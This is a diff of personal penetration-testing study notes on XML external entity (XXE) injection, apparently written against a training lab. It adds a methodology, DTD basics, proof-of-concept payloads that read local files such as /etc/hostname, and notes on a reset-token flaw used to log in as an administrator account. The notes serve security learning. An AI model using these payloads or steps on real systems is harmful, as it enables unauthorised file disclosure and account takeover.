@@ -45,10 +45,16 @@ done
 
 
 #### XXE
+
+**Methodology**:
+1. Check for internal entity inclusion 
+2. Check for external entity inclusion, via referencing a file. Try php base64 encode if it does not work.
+3. Try to redirect output via blind extraction.
+
 - XML external entity injection
 - Exploits the way the web app parses the XML data 
 - When looking for which element of a XML input to inject our payload, look for elements that gets displayed in the response. 
-- Some pages looks like they only respond to JSON data, but they might not have disabeled XML. We can try to change the Content-Type to application/xml and convert the json data to xml with such tool: https://www.convertjson.com/json-to-xml.htm 
+- Some pages looks like they only respond to JSON data, but they might not have disabled XML. We can try to change the Content-Type to application/xml and convert the json data to xml with such tool: https://www.convertjson.com/json-to-xml.htm 
 - XML has a strict syntax on which characters to use, example space, |, <> {} may break it, so consider finding workaround for these characters. 
 - XML can also be used to leak source code, but sometimes we need to encode the file to be able to read it, ex: 
 ```
@@ -60,6 +66,55 @@ done
 **Note:** XXE is usually used to disclose sensitive local files and source code, which may reveal additional vulnerabilities or ways to gain code execution.
 
 - XXE can be used to gain RCE, the easiest way is to look for ssh key on the server and try leaking them.  We can also use the expect module if it is installed. 
+
+
+**Basic xml terminology:**
+![[Pasted image 20260707084903.png]]
+- DTD: Document type definition, allowes the validation of XML doc against pre-defined document structure. This is usually placed right after the xml declaration in the first line, ex:
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email SYSTEM "email.dtd">
+```
+- We can also reference a DTD via a url:
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd">
+```
+- To reference external xml entities, we use the SYSTEM (Can also use PUBLIC)keyword which is followed by the external entity path
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [
+  <!ENTITY company SYSTEM "http://localhost/company.txt">
+  <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
+]>
+```
+
+**POC to check for xml internal entity injection:**
+```
+<?xml version="1.0" encoding="UTF-8"?>  
+<!DOCTYPE root [  
+<!ENTITY flag "hi">  
+]>  
+<root>  
+<name>&flag;</name>  
+<details>test1</details>  
+<date>2026-07-22</date>  
+</root>
+```
+- We try to define a string via dtd, and see if we can print it via 1 of the variables, this should print hi in the name element.
+- Once we have confirmed this, we can try **external entity injection:**
+```
+<?xml version="1.0" encoding="UTF-8"?>  
+<!DOCTYPE root [  
+<!ENTITY flag SYSTEM "file:///etc/hostname">  
+]>  
+<root>  
+<name>&flag;</name>  
+<details>test1</details>  
+<date>2026-07-22</date>  
+</root>
+```
+
 
 **A more advanced way to leak files:**
 ```
@@ -146,5 +201,5 @@ Priority: u=4
 ```
 - The above gives us tokens for any users, notice we have removed the cookie header. 
 - Once we get a token without a phpsession cookie, can be used to reset password? -> must be done with GET request, normal /reset.php is by default POST but it also accepts GET.
-- We need to know the usernames of the uid we just changed -> /api.php/user/id -> only 100 users from 1 - 100. One of the users worked for the company "administrator", we log into this one. 
+- We need to know the usernames of the uid we just changed -> /api.php/user/id -> only 100 users from 1 - 100. One of the users worked for the company "administrator"(id=52), we log into this one. 
 Here we have a way to post xml data, there should be a way to do xxe. 
